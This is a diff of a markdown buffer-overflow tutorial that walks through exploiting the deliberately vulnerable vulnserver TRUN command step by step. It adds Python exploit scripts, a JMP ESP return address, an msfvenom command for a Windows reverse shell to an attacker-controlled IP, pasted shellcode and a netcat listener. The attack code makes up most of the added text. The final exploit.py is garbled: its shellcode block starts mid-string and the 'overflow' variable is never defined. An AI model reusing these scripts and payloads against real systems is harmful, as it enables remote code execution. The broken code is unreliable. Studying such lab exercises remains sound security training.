@@ -183,7 +183,7 @@ except:
 
 ````
 
->Q: What does this code do? \
+>**Q: What does this code do?** \
 >A: The script sends string pattern and we will use this pattern to find the exact offset of the EIP.
 
 4. At this point I assume that you already know the drill of re-running **IMB** and **vulnserver** as Administrator, attach them then **Run**.
@@ -192,7 +192,7 @@ except:
 
 6. Check the **IMB** and the registers should look like this. Please check the **EIP!** Remember why this is very important?
 
-![registers_eip_386f4337](https://github.com/slythx/bufferoverflow/blob/master/vulnserver/img/registers_eip_386f4337.png)
+   ![registers_eip_386f4337](https://github.com/slythx/bufferoverflow/blob/master/vulnserver/img/registers_eip_386f4337.png)
 
 7. Now, we got a **EIP** value from our random offset string. All we have to do is to find its memory address so we know what to replace and where we put our malicious **shell code**.
 
@@ -201,8 +201,9 @@ except:
 ```
 $ /usr/share/metasploit-framework/tools/exploit/pattern_offset.rb -l 3000 -q 386F4337
 ```
-   This should return 2003 bytes
-   ![offset_match_2003](https://github.com/slythx/bufferoverflow/blob/master/vulnserver/img/offset_match.png)
+This should return 2003 bytes
+   
+![offset_match_2003](https://github.com/slythx/bufferoverflow/blob/master/vulnserver/img/offset_match.png)
    
 ## IV. Overwritting the EIP
 
@@ -210,6 +211,244 @@ $ /usr/share/metasploit-framework/tools/exploit/pattern_offset.rb -l 3000 -q 386
    Create a python script named ‘overwrite_eip.py’ and add +x to its permission
 
 >overwrite_eip.py
+
+````python
+#!/usr/bin/python
+import sys 
+import socket 
+
+shell_code = 'A' * 2003 + "B" * 4
+
+try:
+    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+    s.connect(('192.168.17.134', 9999))
+
+    s.send(('TRUN /.:/' + shell_code)
+    s.close()
+except:
+    print "Error connecting to the server!"
+    sys.exit()
+    
+````
+
+>**Q: What is this code do?** \
+>A: It sends 2003 **A**s to the **EAX** and **EBP** then 4 **B**s to the **EIP**. We do this to check exactly if we successfully overwrite the **EIP**. \
+    The result should be like this. Check the **EIP** value, its **42424242** the hex value for 4 **B**s.
+    
+![registers_eip_42424242](https://github.com/slythx/bufferoverflow/blob/master/vulnserver/img/registers_eip_42424242.png)
+
+## V. Finding Bad Characters
+
+1. Google “Bad Characters” for python
+
+2. Copy and paste bad character for python script file. (You know what to do)
+
+>find_bad_char.py
+
+````python
+#!/usr/bin/python
+import sys, socket 
+
+badchars = (
+  "\x01\x02\x03\x04\x05\x06\x07\x08\x09\x0a\x0b\x0c\x0d\x0e\x0f\x10"
+  "\x11\x12\x13\x14\x15\x16\x17\x18\x19\x1a\x1b\x1c\x1d\x1e\x1f\x20"
+  "\x21\x22\x23\x24\x25\x26\x27\x28\x29\x2a\x2b\x2c\x2d\x2e\x2f\x30"
+  "\x31\x32\x33\x34\x35\x36\x37\x38\x39\x3a\x3b\x3c\x3d\x3e\x3f\x40"
+  "\x41\x42\x43\x44\x45\x46\x47\x48\x49\x4a\x4b\x4c\x4d\x4e\x4f\x50"
+  "\x51\x52\x53\x54\x55\x56\x57\x58\x59\x5a\x5b\x5c\x5d\x5e\x5f\x60"
+  "\x61\x62\x63\x64\x65\x66\x67\x68\x69\x6a\x6b\x6c\x6d\x6e\x6f\x70"
+  "\x71\x72\x73\x74\x75\x76\x77\x78\x79\x7a\x7b\x7c\x7d\x7e\x7f\x80"
+  "\x81\x82\x83\x84\x85\x86\x87\x88\x89\x8a\x8b\x8c\x8d\x8e\x8f\x90"
+  "\x91\x92\x93\x94\x95\x96\x97\x98\x99\x9a\x9b\x9c\x9d\x9e\x9f\xa0"
+  "\xa1\xa2\xa3\xa4\xa5\xa6\xa7\xa8\xa9\xaa\xab\xac\xad\xae\xaf\xb0"
+  "\xb1\xb2\xb3\xb4\xb5\xb6\xb7\xb8\xb9\xba\xbb\xbc\xbd\xbe\xbf\xc0"
+  "\xc1\xc2\xc3\xc4\xc5\xc6\xc7\xc8\xc9\xca\xcb\xcc\xcd\xce\xcf\xd0"
+  "\xd1\xd2\xd3\xd4\xd5\xd6\xd7\xd8\xd9\xda\xdb\xdc\xdd\xde\xdf\xe0"
+  "\xe1\xe2\xe3\xe4\xe5\xe6\xe7\xe8\xe9\xea\xeb\xec\xed\xee\xef\xf0"
+  "\xf1\xf2\xf3\xf4\xf5\xf6\xf7\xf8\xf9\xfa\xfb\xfc\xfd\xfe\xff"
+)
+
+shell_code = 'A' * 2003 + 'B' * 4 + badchars
+
+try:
+	s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+	s.connect(('192.168.17.134', 9999))
+
+	payload = 'TRUN /.:/' + shell_code
+	s.send(('TRUN /.:/' + shell_code))
+	s.close()
+except:
+	print "Error connecting to server!"
+	sys.exit()
+
+````
+
+>**Q: What does this code do?** \
+>A: These bad chars are hex value from 01 to FF and we append this to our shell code. \
+    We don't want to include bad characters in our shell code because it will cause trouble and it will cause our shell code not to work.
+    
+3. Re-run **IMD** and **vulnserver**, attach and run then run this python script.
+
+4. On **IMD registers**, right click on the **ESP** value (00FEF9C8 for example) > click **Follow in Dump**.
+
+5. On the **Address/Hex dump** section. Find the hex value that is not in the correct order (01 to FF).
+
+>Note that there is no bad characters found in our exercise. However, this is a example of bad characters.
+
+![address_hexdump_sample](https://github.com/slythx/bufferoverflow/blob/master/vulnserver/img/address_hexdump_sample.png)
+
+## V. Finding the right Module   
+
+1. Download https://github.com/corelan/mona/blob/master/mona.py to your Windows machine
+
+2. Paste it in **"C:\Program Files (x86)\Immunity Inc\Immunity Debugger\PyCommands"**
+
+3. In immunity debugger after attaching vulnserver.exe, type "!mona modules" in bottom text box 
+
+![mona_modules](https://github.com/slythx/bufferoverflow/blob/master/vulnserver/img/mona_modules.png)
+
+4. We should find file or DLL that has no protection (Rebase, SafeSH, ASLR etc.) In this case we can use ***essfunc.dll*** (Remember this file)
+
+5. Now we should find the **Operation code (OP)** equivalent for **JMP ESP (Jump to Stack Pointer)**
+    
+6. On Kali, type '**locate nasm_shell**' then run it.
+
+```
+$ locate nasm_shell
+```
+
+7. Run '**/usr/share/metasploit-framework/tools/exploit/nasm_shell.rb**'
+
+8. In the nasm_shell, type **JMP ESP**. We see that the equivalent hex value of **JMP ESP** is **FFE4**
+
+![jmp_esp](https://github.com/slythx/bufferoverflow/blob/master/vulnserver/img/jmp_esp.png)
+
+9. In IMD bottom textbox, type **!mona find -s "\xff\xe4" -m essfunc.dll** \
+   We can see that the memory address is **625011AF**. We will use this later, this is very important.
+
+![mona_find](https://github.com/slythx/bufferoverflow/blob/master/vulnserver/img/mona_find.png)
+
+10. Save the memory address and use this backwards for the python script (little endian format) \
+    Create python script named ‘**right_module.py**’
+    
+````python
+#!/usr/bin/python
+import sys, socket 
+
+shell_code = 'A' * 2003 + "\xaf\x11\x50\x62"
+
+try:
+	s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+	s.connect(('192.168.17.134', 9999))
+
+	s.send(('TRUN /.:/' + shell_code))
+	s.close()
+except:
+	print("Error connecting to server!")
+	sys.exit()
+````
+
+>Q: What does this code do? \
+>A: We replace the 4 Bs (EIP area) with the reversed memory address of essfunc.dll that have no protection.
+
+
+>Q: Why the memory address is written backwards?\
+>A: In x86 architecture stpres the lower order byte at the lowest memory address and higher byte in highest address. So, we have to put it in reverse order.
+
+11. In IMD, find memory address by clicking this black forward icon ![find_mem_address](https://github.com/slythx/bufferoverflow/blob/master/vulnserver/img/find_mem_address.png) on the top menu, enter the memory addres (jump code). Click **OK**.
+
+![find_mem_address_expression](https://github.com/slythx/bufferoverflow/blob/master/vulnserver/img/find_mem_address_expression.png)
+
+12. Press **F2** to set a breakpoint. We gonna overflow the buffer but when it hits the breakpoint, it's not gonna jump to further instruction. \
+    It will break the program and pause right there, wait for further instructions (commands from the attacker) because we already got the shell at this point.
+
+![set_breakpoint](https://github.com/slythx/bufferoverflow/blob/master/vulnserver/img/set_breakpoint.png)
+
+13. In Kali, run the **./right_module.py**. Check the **IMD** and this must be the result. \
+    We overwritten the **EIP** and the **IMD** status is now Paused ![paused](https://github.com/slythx/bufferoverflow/blob/master/vulnserver/img/paused.png)
+
+![registers_eip_625011af](https://github.com/slythx/bufferoverflow/blob/master/vulnserver/img/registers_eip_625011af.png)
+
+## V. Generating Shellcode ane gaining root privilege!
+
+1. Now that we successfully got control the **EIP**, it's time to generate our malicious code to gain reverse shell. \  
+   On Kali, type enter this command in your terminal. 
+        
+>**LHOST** = Your Kali's IP address \
+>**PORT** = Your listening port for reverse shell \
+>**EXITFUNC** = for thread to make our shell a little bit more stable \
+>**f** = file type, we will export this on c \
+>**p** = payload \
+>**a** = architecture \
+>**b** = bad characters. This is where you put them in. It will be excluded in the generated shell code.
+
+```
+$ msfvenom -p windows/shell_reverse_tcp LHOST=192.168.17.138 LPORT=4444 EXITFUNC=thread -f c -a x86 -b "\x00"
+```
+
+2. Copy and paste the generated string value and use it in our python script. Name it ‘**exploit.py**’
+
+>exploit.py
+
+````python
+\xca\xba\x78\x3d\xf7\x86\xd9\x74\x24\xf4\x5e\x31\xc9\xb1"
+"\x52\x83\xee\xfc\x31\x56\x13\x03\x2e\x2e\x15\x73\x32\xb8\x5b"
+"\x7c\xca\x39\x3c\xf4\x2f\x08\x7c\x62\x24\x3b\x4c\xe0\x68\xb0"
+"\x27\xa4\x98\x43\x45\x61\xaf\xe4\xe0\x57\x9e\xf5\x59\xab\x81"
+"\x75\xa0\xf8\x61\x47\x6b\x0d\x60\x80\x96\xfc\x30\x59\xdc\x53"
+"\xa4\xee\xa8\x6f\x4f\xbc\x3d\xe8\xac\x75\x3f\xd9\x63\x0d\x66"
+"\xf9\x82\xc2\x12\xb0\x9c\x07\x1e\x0a\x17\xf3\xd4\x8d\xf1\xcd"
+"\x15\x21\x3c\xe2\xe7\x3b\x79\xc5\x17\x4e\x73\x35\xa5\x49\x40"
+"\x47\x71\xdf\x52\xef\xf2\x47\xbe\x11\xd6\x1e\x35\x1d\x93\x55"
+"\x11\x02\x22\xb9\x2a\x3e\xaf\x3c\xfc\xb6\xeb\x1a\xd8\x93\xa8"
+"\x03\x79\x7e\x1e\x3b\x99\x21\xff\x99\xd2\xcc\x14\x90\xb9\x98"
+"\xd9\x99\x41\x59\x76\xa9\x32\x6b\xd9\x01\xdc\xc7\x92\x8f\x1b"
+"\x27\x89\x68\xb3\xd6\x32\x89\x9a\x1c\x66\xd9\xb4\xb5\x07\xb2"
+"\x44\x39\xd2\x15\x14\x95\x8d\xd5\xc4\x55\x7e\xbe\x0e\x5a\xa1"
+"\xde\x31\xb0\xca\x75\xc8\x53\x35\x21\xc3\x29\xdd\x30\xe3\x3c"
+"\x42\xbc\x05\x54\x6a\xe8\x9e\xc1\x13\xb1\x54\x73\xdb\x6f\x11"
+"\xb3\x57\x9c\xe6\x7a\x90\xe9\xf4\xeb\x50\xa4\xa6\xba\x6f\x12"
+"\xce\x21\xfd\xf9\x0e\x2f\x1e\x56\x59\x78\xd0\xaf\x0f\x94\x4b"
+"\x06\x2d\x65\x0d\x61\xf5\xb2\xee\x6c\xf4\x37\x4a\x4b\xe6\x81"
+"\x53\xd7\x52\x5e\x02\x81\x0c\x18\xfc\x63\xe6\xf2\x53\x2a\x6e"
+"\x82\x9f\xed\xe8\x8b\xf5\x9b\x14\x3d\xa0\xdd\x2b\xf2\x24\xea"
+"\x54\xee\xd4\x15\x8f\xaa\xf5\xf7\x05\xc7\x9d\xa1\xcc\x6a\xc0"
+"\x51\x3b\xa8\xfd\xd1\xc9\x51\xfa\xca\xb8\x54\x46\x4d\x51\x25"
+"\xd7\x38\x55\x9a\xd8\x68")
+
+# 'A' * 2003			; buffer		
+# "\xaf\x11\x50\x62"	; Jump address		
+# "\x90" * 32			; NOPs sled	
+# overflow				; reverse shell code
+
+shell_code = 'A' * 2003 + "\xaf\x11\x50\x62" + "\x90" * 32 	+ overflow
+
+try:
+	s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+	s.connect(('192.168.17.134', 9999))
+
+	s.send(('TRUN /.:/' + shell_code))
+	s.close()
+except:
+	print("Error connecting to server!")
+	sys.exit()
+	
+````
+
+>**Q: What is NOPs?** \
+>A: A little bit of padding in between jump address and actual shell code.
+
+3. Run **vulnserver.exe** (No need to use **IMD**)
+
+4. On Kali, set a netcat listening port to 4444 ‘**nc -nvlp 4444**’
+
+5. Open new terminal and run **./exploit.py**
+
+![root](https://github.com/slythx/bufferoverflow/blob/master/vulnserver/img/root.png)
+
+# Congratulations! You popped a shell and gained root access !!!
+
+
 
 
 
